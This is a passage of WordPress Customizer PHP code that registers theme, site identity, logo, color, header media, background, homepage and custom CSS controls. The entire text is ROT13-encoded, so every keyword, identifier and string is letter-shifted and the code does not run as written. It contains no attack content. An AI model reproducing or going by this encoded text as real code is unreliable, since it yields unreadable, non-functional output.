					'<c>' . __( 'Juvyr cerivrjvat n arj gurzr, lbh pna pbagvahr gb gnvybe guvatf yvxr jvqtrgf naq zrahf, naq rkcyber gurzr-fcrpvsvp bcgvbaf.' ) . '</c>'
					),
					'pncnovyvgl'  => 'fjvgpu_gurzrf',
					'cevbevgl'    => 0,
				)
			)
		);

		$guvf->nqq_frpgvba(
			arj JC_Phfgbzvmr_Gurzrf_Frpgvba(
				$guvf,
				'vafgnyyrq_gurzrf',
				neenl(
					'gvgyr'      => __( 'Vafgnyyrq gurzrf' ),
					'npgvba'     => 'vafgnyyrq',
					'pncnovyvgl' => 'fjvgpu_gurzrf',
					'cnary'      => 'gurzrf',
					'cevbevgl'   => 0,
				)
			)
		);

		vs ( ! vf_zhygvfvgr() ) {
			$guvf->nqq_frpgvba(
				arj JC_Phfgbzvmr_Gurzrf_Frpgvba(
					$guvf,
					'jcbet_gurzrf',
					neenl(
						'gvgyr'       => __( 'JbeqCerff.bet gurzrf' ),
						'npgvba'      => 'jcbet',
						'svygre_glcr' => 'erzbgr',
						'pncnovyvgl'  => 'vafgnyy_gurzrf',
						'cnary'       => 'gurzrf',
						'cevbevgl'    => 5,
					)
				)
			);
		}

		// Gurzrf Frggvat (hahfrq - gur gurzr vf pbafvqrenoyl zber shaqnzragny gb gur Phfgbzvmre rkcrevrapr).
		$guvf->nqq_frggvat(
			arj JC_Phfgbzvmr_Svygre_Frggvat(
				$guvf,
				'npgvir_gurzr',
				neenl(
					'pncnovyvgl' => 'fjvgpu_gurzrf',
				)
			)
		);

		/* Fvgr Vqragvgl */

		$guvf->nqq_frpgvba(
			'gvgyr_gntyvar',
			neenl(
				'gvgyr'    => __( 'Fvgr Vqragvgl' ),
				'cevbevgl' => 20,
			)
		);

		$guvf->nqq_frggvat(
			'oybtanzr',
			neenl(
				'qrsnhyg'    => trg_bcgvba( 'oybtanzr' ),
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'znantr_bcgvbaf',
			)
		);

		$guvf->nqq_pbageby(
			'oybtanzr',
			neenl(
				'ynory'   => __( 'Fvgr Gvgyr' ),
				'frpgvba' => 'gvgyr_gntyvar',
			)
		);

		$guvf->nqq_frggvat(
			'oybtqrfpevcgvba',
			neenl(
				'qrsnhyg'    => trg_bcgvba( 'oybtqrfpevcgvba' ),
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'znantr_bcgvbaf',
			)
		);

		$guvf->nqq_pbageby(
			'oybtqrfpevcgvba',
			neenl(
				'ynory'   => __( 'Gntyvar' ),
				'frpgvba' => 'gvgyr_gntyvar',
			)
		);

		// Nqq n frggvat gb uvqr urnqre grkg vs gur gurzr qbrfa'g fhccbeg phfgbz urnqref.
		vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'urnqre-grkg' ) ) {
			$guvf->nqq_frggvat(
				'urnqre_grkg',
				neenl(
					'gurzr_fhccbegf'    => neenl( 'phfgbz-ybtb', 'urnqre-grkg' ),
					'qrsnhyg'           => 1,
					'fnavgvmr_pnyyonpx' => 'nofvag',
				)
			);

			$guvf->nqq_pbageby(
				'urnqre_grkg',
				neenl(
					'ynory'    => __( 'Qvfcynl Fvgr Gvgyr naq Gntyvar' ),
					'frpgvba'  => 'gvgyr_gntyvar',
					'frggvatf' => 'urnqre_grkg',
					'glcr'     => 'purpxobk',
				)
			);
		}

		$guvf->nqq_frggvat(
			'fvgr_vpba',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'znantr_bcgvbaf',
				'genafcbeg'  => 'cbfgZrffntr', // Cerivrjrq jvgu WF va gur Phfgbzvmre pbagebyf jvaqbj.
			)
		);

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Fvgr_Vpba_Pbageby(
				$guvf,
				'fvgr_vpba',
				neenl(
					'ynory'       => __( 'Fvgr Vpba' ),
					'qrfpevcgvba' => fcevags(
						/* genafyngbef: 1: cvkry inyhr sbe vpba fvmr. 2: cvkry inyhr sbe vpba fvmr. */
						'<c>' . __( 'Gur Fvgr Vpba vf jung lbh frr va oebjfre gnof, obbxznex onef, naq jvguva gur JbeqCerff zbovyr nccf. Vg fubhyq or fdhner naq ng yrnfg <pbqr>%1$f ol %2$f</pbqr> cvkryf.' ) . '</c>',
						512,
						512
					),
					'frpgvba'     => 'gvgyr_gntyvar',
					'cevbevgl'    => 60,
					'urvtug'      => 512,
					'jvqgu'       => 512,
				)
			)
		);

		$guvf->nqq_frggvat(
			'phfgbz_ybtb',
			neenl(
				'gurzr_fhccbegf' => neenl( 'phfgbz-ybtb' ),
				'genafcbeg'      => 'cbfgZrffntr',
			)
		);

		$phfgbz_ybtb_netf = trg_gurzr_fhccbeg( 'phfgbz-ybtb' );
		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Pebccrq_Vzntr_Pbageby(
				$guvf,
				'phfgbz_ybtb',
				neenl(
					'ynory'         => __( 'Ybtb' ),
					'frpgvba'       => 'gvgyr_gntyvar',
					'cevbevgl'      => 8,
					'urvtug'        => vffrg( $phfgbz_ybtb_netf[0]['urvtug'] ) ? $phfgbz_ybtb_netf[0]['urvtug'] : ahyy,
					'jvqgu'         => vffrg( $phfgbz_ybtb_netf[0]['jvqgu'] ) ? $phfgbz_ybtb_netf[0]['jvqgu'] : ahyy,
					'syrk_urvtug'   => vffrg( $phfgbz_ybtb_netf[0]['syrk-urvtug'] ) ? $phfgbz_ybtb_netf[0]['syrk-urvtug'] : ahyy,
					'syrk_jvqgu'    => vffrg( $phfgbz_ybtb_netf[0]['syrk-jvqgu'] ) ? $phfgbz_ybtb_netf[0]['syrk-jvqgu'] : ahyy,
					'ohggba_ynoryf' => neenl(
						'fryrpg'       => __( 'Fryrpg ybtb' ),
						'punatr'       => __( 'Punatr ybtb' ),
						'erzbir'       => __( 'Erzbir' ),
						'qrsnhyg'      => __( 'Qrsnhyg' ),
						'cynprubyqre'  => __( 'Ab ybtb fryrpgrq' ),
						'senzr_gvgyr'  => __( 'Fryrpg ybtb' ),
						'senzr_ohggba' => __( 'Pubbfr ybtb' ),
					),
				)
			)
		);

		$guvf->fryrpgvir_erserfu->nqq_cnegvny(
			'phfgbz_ybtb',
			neenl(
				'frggvatf'            => neenl( 'phfgbz_ybtb' ),
				'fryrpgbe'            => '.phfgbz-ybtb-yvax',
				'eraqre_pnyyonpx'     => neenl( $guvf, '_eraqre_phfgbz_ybtb_cnegvny' ),
				'pbagnvare_vapyhfvir' => gehr,
			)
		);

		/* Pbybef */

		$guvf->nqq_frpgvba(
			'pbybef',
			neenl(
				'gvgyr'    => __( 'Pbybef' ),
				'cevbevgl' => 40,
			)
		);

		$guvf->nqq_frggvat(
			'urnqre_grkgpbybe',
			neenl(
				'gurzr_fhccbegf'       => neenl( 'phfgbz-urnqre', 'urnqre-grkg' ),
				'qrsnhyg'              => trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-grkg-pbybe' ),

				'fnavgvmr_pnyyonpx'    => neenl( $guvf, '_fnavgvmr_urnqre_grkgpbybe' ),
				'fnavgvmr_wf_pnyyonpx' => 'znlor_unfu_urk_pbybe',
			)
		);

		// Vachg glcr: purpxobk, jvgu phfgbz inyhr.
		$guvf->nqq_pbageby(
			'qvfcynl_urnqre_grkg',
			neenl(
				'frggvatf' => 'urnqre_grkgpbybe',
				'ynory'    => __( 'Qvfcynl Fvgr Gvgyr naq Gntyvar' ),
				'frpgvba'  => 'gvgyr_gntyvar',
				'glcr'     => 'purpxobk',
				'cevbevgl' => 40,
			)
		);

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Pbybe_Pbageby(
				$guvf,
				'urnqre_grkgpbybe',
				neenl(
					'ynory'   => __( 'Urnqre Grkg Pbybe' ),
					'frpgvba' => 'pbybef',
				)
			)
		);

		// Vachg glcr: pbybe, jvgu fnavgvmr_pnyyonpx.
		$guvf->nqq_frggvat(
			'onpxtebhaq_pbybe',
			neenl(
				'qrsnhyg'              => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-pbybe' ),
				'gurzr_fhccbegf'       => 'phfgbz-onpxtebhaq',

				'fnavgvmr_pnyyonpx'    => 'fnavgvmr_urk_pbybe_ab_unfu',
				'fnavgvmr_wf_pnyyonpx' => 'znlor_unfu_urk_pbybe',
			)
		);

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Pbybe_Pbageby(
				$guvf,
				'onpxtebhaq_pbybe',
				neenl(
					'ynory'   => __( 'Onpxtebhaq Pbybe' ),
					'frpgvba' => 'pbybef',
				)
			)
		);

		/* Phfgbz Urnqre */

		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'ivqrb' ) ) {
			$gvgyr       = __( 'Urnqre Zrqvn' );
			$qrfpevcgvba = '<c>' . __( 'Vs lbh nqq n ivqrb, gur vzntr jvyy or hfrq nf n snyyonpx juvyr gur ivqrb ybnqf.' ) . '</c>';

			$jvqgu  = nofvag( trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'jvqgu' ) );
			$urvtug = nofvag( trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'urvtug' ) );
			vs ( $jvqgu && $urvtug ) {
				$pbageby_qrfpevcgvba = fcevags(
					/* genafyngbef: 1: .zc4, 2: Urnqre fvmr va cvkryf. */
					__( 'Hcybnq lbhe ivqrb va %1$f sbezng naq zvavzvmr vgf svyr fvmr sbe orfg erfhygf. Lbhe gurzr erpbzzraqf qvzrafvbaf bs %2$f cvkryf.' ),
					'<pbqr>.zc4</pbqr>',
					fcevags( '<fgebat>%f &gvzrf; %f</fgebat>', $jvqgu, $urvtug )
				);
			} ryfrvs ( $jvqgu ) {
				$pbageby_qrfpevcgvba = fcevags(
					/* genafyngbef: 1: .zc4, 2: Urnqre jvqgu va cvkryf. */
					__( 'Hcybnq lbhe ivqrb va %1$f sbezng naq zvavzvmr vgf svyr fvmr sbe orfg erfhygf. Lbhe gurzr erpbzzraqf n jvqgu bs %2$f cvkryf.' ),
					'<pbqr>.zc4</pbqr>',
					fcevags( '<fgebat>%f</fgebat>', $jvqgu )
				);
			} ryfr {
				$pbageby_qrfpevcgvba = fcevags(
					/* genafyngbef: 1: .zc4, 2: Urnqre urvtug va cvkryf. */
					__( 'Hcybnq lbhe ivqrb va %1$f sbezng naq zvavzvmr vgf svyr fvmr sbe orfg erfhygf. Lbhe gurzr erpbzzraqf n urvtug bs %2$f cvkryf.' ),
					'<pbqr>.zc4</pbqr>',
					fcevags( '<fgebat>%f</fgebat>', $urvtug )
				);
			}
		} ryfr {
			$gvgyr               = __( 'Urnqre Vzntr' );
			$qrfpevcgvba         = '';
			$pbageby_qrfpevcgvba = '';
		}

		$guvf->nqq_frpgvba(
			'urnqre_vzntr',
			neenl(
				'gvgyr'          => $gvgyr,
				'qrfpevcgvba'    => $qrfpevcgvba,
				'gurzr_fhccbegf' => 'phfgbz-urnqre',
				'cevbevgl'       => 60,
			)
		);

		$guvf->nqq_frggvat(
			'urnqre_ivqrb',
			neenl(
				'gurzr_fhccbegf'    => neenl( 'phfgbz-urnqre', 'ivqrb' ),
				'genafcbeg'         => 'cbfgZrffntr',
				'fnavgvmr_pnyyonpx' => 'nofvag',
				'inyvqngr_pnyyonpx' => neenl( $guvf, '_inyvqngr_urnqre_ivqrb' ),
			)
		);

		$guvf->nqq_frggvat(
			'rkgreany_urnqre_ivqrb',
			neenl(
				'gurzr_fhccbegf'    => neenl( 'phfgbz-urnqre', 'ivqrb' ),
				'genafcbeg'         => 'cbfgZrffntr',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_rkgreany_urnqre_ivqrb' ),
				'inyvqngr_pnyyonpx' => neenl( $guvf, '_inyvqngr_rkgreany_urnqre_ivqrb' ),
			)
		);

		$guvf->nqq_frggvat(
			arj JC_Phfgbzvmr_Svygre_Frggvat(
				$guvf,
				'urnqre_vzntr',
				neenl(
					'qrsnhyg'        => fcevags( trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-vzntr' ), trg_grzcyngr_qverpgbel_hev(), trg_fglyrfurrg_qverpgbel_hev() ),
					'gurzr_fhccbegf' => 'phfgbz-urnqre',
				)
			)
		);

		$guvf->nqq_frggvat(
			arj JC_Phfgbzvmr_Urnqre_Vzntr_Frggvat(
				$guvf,
				'urnqre_vzntr_qngn',
				neenl(
					'gurzr_fhccbegf' => 'phfgbz-urnqre',
				)
			)
		);

		/*
		 * Fjvgpu vzntr frggvatf gb cbfgZrffntr jura ivqrb fhccbeg vf ranoyrq fvapr
		 * vg ragnvyf gung gur_phfgbz_urnqre_znexhc() jvyy or hfrq, naq guhf fryrpgvir
		 * erserfu pna or hgvyvmrq.
		 */
		vs ( pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'ivqrb' ) ) {
			$guvf->trg_frggvat( 'urnqre_vzntr' )->genafcbeg      = 'cbfgZrffntr';
			$guvf->trg_frggvat( 'urnqre_vzntr_qngn' )->genafcbeg = 'cbfgZrffntr';
		}

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Zrqvn_Pbageby(
				$guvf,
				'urnqre_ivqrb',
				neenl(
					'gurzr_fhccbegf'  => neenl( 'phfgbz-urnqre', 'ivqrb' ),
					'ynory'           => __( 'Urnqre Ivqrb' ),
					'qrfpevcgvba'     => $pbageby_qrfpevcgvba,
					'frpgvba'         => 'urnqre_vzntr',
					'zvzr_glcr'       => 'ivqrb',
					'npgvir_pnyyonpx' => 'vf_urnqre_ivqrb_npgvir',
				)
			)
		);

		$guvf->nqq_pbageby(
			'rkgreany_urnqre_ivqrb',
			neenl(
				'gurzr_fhccbegf'  => neenl( 'phfgbz-urnqre', 'ivqrb' ),
				'glcr'            => 'hey',
				'qrfpevcgvba'     => __( 'Be, ragre n LbhGhor HEY:' ),
				'frpgvba'         => 'urnqre_vzntr',
				'npgvir_pnyyonpx' => 'vf_urnqre_ivqrb_npgvir',
			)
		);

		$guvf->nqq_pbageby( arj JC_Phfgbzvmr_Urnqre_Vzntr_Pbageby( $guvf ) );

		$guvf->fryrpgvir_erserfu->nqq_cnegvny(
			'phfgbz_urnqre',
			neenl(
				'fryrpgbe'            => '#jc-phfgbz-urnqre',
				'eraqre_pnyyonpx'     => 'gur_phfgbz_urnqre_znexhc',
				'frggvatf'            => neenl( 'urnqre_ivqrb', 'rkgreany_urnqre_ivqrb', 'urnqre_vzntr' ), // Gur vzntr vf hfrq nf n ivqrb snyyonpx urer.
				'pbagnvare_vapyhfvir' => gehr,
			)
		);

		/* Phfgbz Onpxtebhaq */

		$guvf->nqq_frpgvba(
			'onpxtebhaq_vzntr',
			neenl(
				'gvgyr'          => __( 'Onpxtebhaq Vzntr' ),
				'gurzr_fhccbegf' => 'phfgbz-onpxtebhaq',
				'cevbevgl'       => 80,
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_vzntr',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-vzntr' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
			)
		);

		$guvf->nqq_frggvat(
			arj JC_Phfgbzvmr_Onpxtebhaq_Vzntr_Frggvat(
				$guvf,
				'onpxtebhaq_vzntr_guhzo',
				neenl(
					'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
					'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
				)
			)
		);

		$guvf->nqq_pbageby( arj JC_Phfgbzvmr_Onpxtebhaq_Vzntr_Pbageby( $guvf ) );

		$guvf->nqq_frggvat(
			'onpxtebhaq_cerfrg',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cerfrg' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
			)
		);

		$guvf->nqq_pbageby(
			'onpxtebhaq_cerfrg',
			neenl(
				'ynory'   => _k( 'Cerfrg', 'Onpxtebhaq Cerfrg' ),
				'frpgvba' => 'onpxtebhaq_vzntr',
				'glcr'    => 'fryrpg',
				'pubvprf' => neenl(
					'qrsnhyg' => _k( 'Qrsnhyg', 'Qrsnhyg Cerfrg' ),
					'svyy'    => __( 'Svyy Fperra' ),
					'svg'     => __( 'Svg gb Fperra' ),
					'ercrng'  => _k( 'Ercrng', 'Ercrng Vzntr' ),
					'phfgbz'  => _k( 'Phfgbz', 'Phfgbz Cerfrg' ),
				),
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_cbfvgvba_k',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-k' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_cbfvgvba_l',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-cbfvgvba-l' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
			)
		);

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Onpxtebhaq_Cbfvgvba_Pbageby(
				$guvf,
				'onpxtebhaq_cbfvgvba',
				neenl(
					'ynory'    => __( 'Vzntr Cbfvgvba' ),
					'frpgvba'  => 'onpxtebhaq_vzntr',
					'frggvatf' => neenl(
						'k' => 'onpxtebhaq_cbfvgvba_k',
						'l' => 'onpxtebhaq_cbfvgvba_l',
					),
				)
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_fvmr',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-fvmr' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
			)
		);

		$guvf->nqq_pbageby(
			'onpxtebhaq_fvmr',
			neenl(
				'ynory'   => __( 'Vzntr Fvmr' ),
				'frpgvba' => 'onpxtebhaq_vzntr',
				'glcr'    => 'fryrpg',
				'pubvprf' => neenl(
					'nhgb'    => _k( 'Bevtvany', 'Bevtvany Fvmr' ),
					'pbagnva' => __( 'Svg gb Fperra' ),
					'pbire'   => __( 'Svyy Fperra' ),
				),
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_ercrng',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-ercrng' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
			)
		);

		$guvf->nqq_pbageby(
			'onpxtebhaq_ercrng',
			neenl(
				'ynory'   => __( 'Ercrng Onpxtebhaq Vzntr' ),
				'frpgvba' => 'onpxtebhaq_vzntr',
				'glcr'    => 'purpxobk',
			)
		);

		$guvf->nqq_frggvat(
			'onpxtebhaq_nggnpuzrag',
			neenl(
				'qrsnhyg'           => trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-nggnpuzrag' ),
				'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_onpxtebhaq_frggvat' ),
				'gurzr_fhccbegf'    => 'phfgbz-onpxtebhaq',
			)
		);

		$guvf->nqq_pbageby(
			'onpxtebhaq_nggnpuzrag',
			neenl(
				'ynory'   => __( 'Fpebyy jvgu Cntr' ),
				'frpgvba' => 'onpxtebhaq_vzntr',
				'glcr'    => 'purpxobk',
			)
		);

		/*
		 * Vs gur gurzr vf hfvat gur qrsnhyg onpxtebhaq pnyyonpx, jr pna hcqngr
		 * gur onpxtebhaq PFF hfvat cbfgZrffntr.
		 */
		vs ( trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'jc-urnq-pnyyonpx' ) === '_phfgbz_onpxtebhaq_po' ) {
			sbernpu ( neenl( 'pbybe', 'vzntr', 'cerfrg', 'cbfvgvba_k', 'cbfvgvba_l', 'fvmr', 'ercrng', 'nggnpuzrag' ) nf $cebc ) {
				$guvf->trg_frggvat( 'onpxtebhaq_' . $cebc )->genafcbeg = 'cbfgZrffntr';
			}
		}

		/*
		 * Fgngvp Sebag Cntr
		 * Frr nyfb uggcf://pber.genp.jbeqcerff.bet/gvpxrg/19627 juvpu vagebqhprf gur fgngvp-sebag-cntr gurzr_fhccbeg.
		 * Gur sbyybjvat ercyvpngrf orunivbe sebz bcgvbaf-ernqvat.cuc.
		 */

		$guvf->nqq_frpgvba(
			'fgngvp_sebag_cntr',
			neenl(
				'gvgyr'           => __( 'Ubzrcntr Frggvatf' ),
				'cevbevgl'        => 120,
				'qrfpevcgvba'     => __( 'Lbh pna pubbfr jung&#8217;f qvfcynlrq ba gur ubzrcntr bs lbhe fvgr. Vg pna or cbfgf va erirefr puebabybtvpny beqre (pynffvp oybt), be n svkrq/fgngvp cntr. Gb frg n fgngvp ubzrcntr, lbh svefg arrq gb perngr gjb Cntrf. Bar jvyy orpbzr gur ubzrcntr, naq gur bgure jvyy or jurer lbhe cbfgf ner qvfcynlrq.' ),
				'npgvir_pnyyonpx' => neenl( $guvf, 'unf_choyvfurq_cntrf' ),
			)
		);

		$guvf->nqq_frggvat(
			'fubj_ba_sebag',
			neenl(
				'qrsnhyg'    => trg_bcgvba( 'fubj_ba_sebag' ),
				'pncnovyvgl' => 'znantr_bcgvbaf',
				'glcr'       => 'bcgvba',
			)
		);

		$guvf->nqq_pbageby(
			'fubj_ba_sebag',
			neenl(
				'ynory'   => __( 'Lbhe ubzrcntr qvfcynlf' ),
				'frpgvba' => 'fgngvp_sebag_cntr',
				'glcr'    => 'enqvb',
				'pubvprf' => neenl(
					'cbfgf' => __( 'Lbhe yngrfg cbfgf' ),
					'cntr'  => __( 'N fgngvp cntr' ),
				),
			)
		);

		$guvf->nqq_frggvat(
			'cntr_ba_sebag',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'znantr_bcgvbaf',
			)
		);

		$guvf->nqq_pbageby(
			'cntr_ba_sebag',
			neenl(
				'ynory'          => __( 'Ubzrcntr' ),
				'frpgvba'        => 'fgngvp_sebag_cntr',
				'glcr'           => 'qebcqbja-cntrf',
				'nyybj_nqqvgvba' => gehr,
			)
		);

		$guvf->nqq_frggvat(
			'cntr_sbe_cbfgf',
			neenl(
				'glcr'       => 'bcgvba',
				'pncnovyvgl' => 'znantr_bcgvbaf',
			)
		);

		$guvf->nqq_pbageby(
			'cntr_sbe_cbfgf',
			neenl(
				'ynory'          => __( 'Cbfgf cntr' ),
				'frpgvba'        => 'fgngvp_sebag_cntr',
				'glcr'           => 'qebcqbja-cntrf',
				'nyybj_nqqvgvba' => gehr,
			)
		);

		/* Phfgbz PFF */
		$frpgvba_qrfpevcgvba  = '<c>';
		$frpgvba_qrfpevcgvba .= __( 'Nqq lbhe bja PFF pbqr urer gb phfgbzvmr gur nccrnenapr naq ynlbhg bs lbhe fvgr.' );
		$frpgvba_qrfpevcgvba .= fcevags(
			' <n uers=\"%1$f\" pynff=\"rkgreany-yvax\" gnetrg=\"_oynax\">%2$f<fcna pynff=\"fperra-ernqre-grkg\"> %3$f</fcna></n>',
			rfp_hey( __( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/pff/' ) ),
			__( 'Yrnea zber nobhg PFF' ),
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( '(bcraf va n arj gno)' )
		);
		$frpgvba_qrfpevcgvba .= '</c>';

		$frpgvba_qrfpevcgvba .= '<c vq=\"rqvgbe-xrlobneq-genc-uryc-1\">' . __( 'Jura hfvat n xrlobneq gb anivtngr:' ) . '</c>';
		$frpgvba_qrfpevcgvba .= '<hy>';
		$frpgvba_qrfpevcgvba .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-2\">' . __( 'Va gur rqvgvat nern, gur Gno xrl ragref n gno punenpgre.' ) . '</yv>';
		$frpgvba_qrfpevcgvba .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-3\">' . __( 'Gb zbir njnl sebz guvf nern, cerff gur Rfp xrl sbyybjrq ol gur Gno xrl.' ) . '</yv>';
		$frpgvba_qrfpevcgvba .= '<yv vq=\"rqvgbe-xrlobneq-genc-uryc-4\">' . __( 'Fperra ernqre hfref: jura va sbezf zbqr, lbh znl arrq gb cerff gur Rfp xrl gjvpr.' ) . '</yv>';
		$frpgvba_qrfpevcgvba .= '</hy>';

		vs ( 'snyfr' !== jc_trg_pheerag_hfre()->flagnk_uvtuyvtugvat ) {
			$frpgvba_qrfpevcgvba .= '<c>';
			$frpgvba_qrfpevcgvba .= fcevags(
				/* genafyngbef: 1: Yvax gb hfre cebsvyr, 2: Nqqvgvbany yvax nggevohgrf, 3: Npprffvovyvgl grkg. */
				__( 'Gur rqvg svryq nhgbzngvpnyyl uvtuyvtugf pbqr flagnk. Lbh pna qvfnoyr guvf va lbhe <n uers=\"%1$f\" %2$f>hfre cebsvyr%3$f</n> gb jbex va cynva grkg zbqr.' ),
				rfp_hey( trg_rqvg_cebsvyr_hey() ),
				'pynff=\"rkgreany-yvax\" gnetrg=\"_oynax\"',
				fcevags(
					'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna>',
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( '(bcraf va n arj gno)' )
				)
			);
			$frpgvba_qrfpevcgvba .= '</c>';
		}

		$frpgvba_qrfpevcgvba .= '<c pynff=\"frpgvba-qrfpevcgvba-ohggbaf\">';
		$frpgvba_qrfpevcgvba .= '<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax frpgvba-qrfpevcgvba-pybfr\">' . __( 'Pybfr' ) . '</ohggba>';
		$frpgvba_qrfpevcgvba .= '</c>';

		$guvf->nqq_frpgvba(
			'phfgbz_pff',
			neenl(
				'gvgyr'              => __( 'Nqqvgvbany PFF' ),
				'cevbevgl'           => 200,
				'qrfpevcgvba_uvqqra' => gehr,
				'qrfpevcgvba'        => $frpgvba_qrfpevcgvba,
			)
		);

		$phfgbz_pff_frggvat = arj JC_Phfgbzvmr_Phfgbz_PFF_Frggvat(
			$guvf,
			fcevags( 'phfgbz_pff[%f]', trg_fglyrfurrg() ),
			neenl(
				'pncnovyvgl' => 'rqvg_pff',
				'qrsnhyg'    => '',
			)
		);
		$guvf->nqq_frggvat( $phfgbz_pff_frggvat );

		$guvf->nqq_pbageby(
			arj JC_Phfgbzvmr_Pbqr_Rqvgbe_Pbageby(
				$guvf,
				'phfgbz_pff',
				neenl(
					'ynory'       => __( 'PFF pbqr' ),
					'frpgvba'     => 'phfgbz_pff',
					'frggvatf'    => neenl( 'qrsnhyg' => $phfgbz_pff_frggvat->vq ),
					'pbqr_glcr'   => 'grkg/pff',
					'vachg_nggef' => neenl(
						'nevn-qrfpevorqol' => 'rqvgbe-xrlobneq-genc-uryc-1 rqvgbe-xrlobneq-genc-uryc-2 rqvgbe-xrlobneq-genc-uryc-3 rqvgbe-xrlobneq-genc-uryc-4',
					),
				)
			)
		);
	}

	/**
	 * Ergheaf jurgure gurer ner choyvfurq cntrf.
	 *
	 * Hfrq nf npgvir pnyyonpx sbe fgngvp sebag cntr frpgvba naq pbagebyf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea obby Jurgure gurer ner choyvfurq (be gb or choyvfurq) cntrf.
	 */
	choyvp shapgvba unf_choyvfurq_cntrf() {

		$frggvat = $guvf->trg_frggvat( 'ani_zrahf_perngrq_cbfgf' );
		vs ( $frggvat ) {
			sbernpu ( $frggvat->inyhr() nf $cbfg_vq ) {
				vs ( 'cntr' === trg_cbfg_glcr( $cbfg_vq ) ) {
					erghea gehr;
				}
			}
		}

		erghea 0 !== pbhag(
			trg_cntrf(
				neenl(
					'ahzore'       => 1,
					'uvrenepuvpny' => 0,
				)
			)
		);
	}

	/**
	 * Nqqf frggvatf sebz gur CBFG qngn gung jrer abg nqqrq jvgu pbqr, r.t. qlanzvpnyyl-perngrq frggvatf sbe Jvqtrgf
	 *
	 * @fvapr 4.2.0
	 *
	 * @frr nqq_qlanzvp_frggvatf()
	 */
	choyvp shapgvba ertvfgre_qlanzvp_frggvatf() {
		$frggvat_vqf = neenl_xrlf( $guvf->hafnavgvmrq_cbfg_inyhrf() );
		$guvf->nqq_qlanzvp_frggvatf( $frggvat_vqf );
	}

	/**
	 * Ybnqf gurzrf vagb gur gurzr oebjfvat/vafgnyyngvba HV.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba unaqyr_ybnq_gurzrf_erdhrfg() {
		purpx_nwnk_ersrere( 'fjvgpu_gurzrf', 'abapr' );

		vs ( ! pheerag_hfre_pna( 'fjvgpu_gurzrf' ) ) {
			jc_qvr( -1 );
		}

		vs ( rzcgl( $_CBFG['gurzr_npgvba'] ) ) {
			jc_fraq_wfba_reebe( 'zvffvat_gurzr_npgvba' );
		}
		$gurzr_npgvba = fnavgvmr_xrl( $_CBFG['gurzr_npgvba'] );
		$gurzrf       = neenl();
		$netf         = neenl();

		// Qrsvar dhrel svygref onfrq ba hfre vachg.
